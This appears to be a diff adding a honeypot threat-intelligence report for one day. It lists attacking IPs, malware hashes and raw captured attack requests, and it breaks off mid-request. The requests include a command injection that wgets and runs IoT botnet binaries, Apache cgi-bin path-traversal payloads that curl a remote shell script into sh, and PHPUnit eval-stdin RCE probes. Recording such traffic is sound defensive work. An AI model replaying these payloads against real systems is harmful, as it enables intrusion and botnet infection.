@@ -1,0 +1,185 @@
+Top 5 IPs for 2024-06-22 :
+
+191.5.206.212
+104.224.177.195
+190.89.90.70
+208.81.201.3
+217.164.233.64
+
+Malware Observed:
+
+
+File name : sshd
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+https://www.virustotal.com/gui/file/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+
+
+63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+https://www.virustotal.com/gui/file/63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+
+
+7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+https://www.virustotal.com/gui/file/7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+
+
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+
+
+Commands/exploits observed:
+
+GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\\/test.kovey-net.ru/V8thsLW8/4cByBa7;chmod+777+4cByBa7;./4cByBa7+ipcams.arm7;wget+http:/\\/test.kovey-net.ru/V8thsLW8/x8I6z9wps;chmod+777+x8I6z9wps;./x8I6z9wps+ipcams.mips;wget+http:/\\/test.kovey-net.ru/V8thsLW8/1xYBSa5;chmod+777+1xYBSa5;./1xYBSa5+ipcams.arm5;wget+http:/\\/test.kovey-net.ru/V8thsLW8/HxYNxi6a6;chmod+777+HxYNxi6a6;./HxYNxi6a6+ipcams.arm6;wget+http:/\\/test.kovey-net.ru/V8thsLW8/uRoRJTa4;chmod+777+uRoRJTa4;./uRoRJTa4+ipcams.arm4 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+
+
+
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 105
+Content-Type: text/plain
+
+X=$(curl http://185.172.128.93/sh || wget http://185.172.128.93/sh -O-); echo "$X" | sh -s apache.selfrepPOST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 105
+Content-Type: text/plain
+
+X=$(curl http://185.172.128.93/sh || wget http://185.172.128.93/sh -O-); echo "$X" | sh -s apache.selfrepGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host:<Host IP>
+
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: <Host IP>
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Content-Length: 33
+Content-Type: text/plain
+
+<?php echo(md5("Hello PHPUnit"));GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+Accept: */*
+Connection: keep-alive
+Host: 
+
+
